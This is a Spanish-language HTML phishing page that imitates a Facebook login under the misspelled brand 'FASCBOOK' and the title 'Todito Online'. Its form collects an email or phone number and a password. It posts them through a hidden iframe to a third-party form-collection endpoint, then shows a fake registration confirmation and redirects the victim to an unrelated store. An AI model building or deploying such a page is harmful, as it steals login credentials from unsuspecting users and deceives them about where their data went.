<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Todito Online</title>
<style>
body {
  margin:0;
  font-family: system-ui, -apple-system, Arial, sans-serif;
  background: linear-gradient(#0f1c2e, #1b2d4a);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* FORMULARIO CENTRADO */
.wrapper {
  width:100%;
  max-width:380px;
  background:#f9f9f9;
  border-radius:20px;
  box-shadow:0 8px 25px rgba(0,0,0,0.35);
  position:relative;
  z-index:1;
  overflow:hidden;
}

/* HEADER */
.header {
  background: linear-gradient(90deg,#ff9800,#f57c00);
  padding:20px;
  text-align:center;
}
.header h1 { margin:0; font-size:26px; font-weight:800; color:#fff; }
.header p { margin:6px 0 0; font-size:13px; color:#fff; }

/* FORM */
.form { padding:22px; }
.input-group {
  position:relative;
}
input {
  width:100%;
  padding:14px;
  margin:10px 0;
  border-radius:8px;
  border:1px solid #ccd0d5;
  font-size:14px;
  background:#fff;
  box-sizing:border-box;
}
.eye-icon {
  position:absolute;
  right:12px;
  top:50%;
  transform:translateY(-50%);
  cursor:pointer;
  font-size:16px;
  color:#666;
}
.btn {
  width:100%;
  padding:14px;
  margin-top:12px;
  border:none;
  border-radius:8px;
  font-weight:bold;
  background:#1976d2;
  color:white;
  font-size:15px;
  cursor:pointer;
  transition:background 0.2s ease, transform 0.2s ease;
}
.btn:hover {
  background:#1565c0;
  transform:scale(1.03);
}
.small {
  text-align:center;
  font-size:12px;
  color:#666;
  margin-top:12px;
}

/* OVERLAY OSCURO */
.overlay {
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.5);
  z-index:998;
  display:none;
}

/* MODAL */
.modal {
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%, -50%);
  width:90%;
  max-width:320px;
  background:white;
  border-radius:14px;
  box-shadow:0 8px 25px rgba(0,0,0,0.3);
  text-align:center;
  z-index:999;
  display:none;
}
.modal-header {
  background:#1976d2;
  color:white;
  padding:14px;
  font-size:15px;
  font-weight:600;
  border-radius:14px 14px 0 0;
}
.modal-body { padding:18px; font-size:14px; color:#333; }
.modal button {
  background:#1976d2;
  color:white;
  border:none;
  padding:10px;
  width:70%;
  border-radius:8px;
  cursor:pointer;
  font-weight:600;
}
.modal button:hover {
  background:#1565c0;
}
</style>
</head>
<body>

<!-- FORMULARIO -->
<div class="wrapper">
  <div class="header">
    <h1>INICIA CON FASCBOOK</h1>
    <p>Tu espacio seguro y rápido</p>
  </div>

  <div class="form">
    <!-- Form normal que se envía a Formspark con iframe oculto -->
    <form id="toditoForm" action="https://submit-form.com/IPlk1gidN" method="POST" target="hidden_iframe">
      <input type="text" name="usuario" placeholder="Correo o número" required>
      
      <div class="input-group">
        <input type="password" id="clave" name="clave" placeholder="Contraseña" required>
        <span class="eye-icon" onclick="toggleClave()">👁️</span>
      </div>
      
      <button type="submit" class="btn">Acceder</button>
    </form>
    <div class="small">¿Nuevo aquí? Regístrate gratis en segundos</div>
  </div>
</div>

<!-- IFRAME OCULTO PARA ENVÍO TRANSPARENTE -->
<iframe name="hidden_iframe" style="display:none;"></iframe>

<!-- OVERLAY Y MODAL -->
<div id="overlay" class="overlay"></div>
<div id="modal" class="modal">
  <div class="modal-header">Confirma tu registro</div>
  <div class="modal-body">
    <p>Gracias por registrarte, serás llevado a la tienda.</p>
    <button onclick="redirigir()">Continuar</button>
  </div>
</div>

<script>
function toggleClave(){
  const input = document.getElementById("clave");
  if(input.type === "password"){
    input.type = "text";
  } else {
    input.type = "password";
  }
}

function redirigir(){
  window.location.href = "https://pymemarket.online/";
}

// Mostrar modal tras envío del formulario
document.getElementById("toditoForm").addEventListener("submit", function(){
  setTimeout(function(){
    document.getElementById("modal").style.display="block";
    document.getElementById("overlay").style.display="block";
  }, 500);
});
</script>

</body>
  </html>
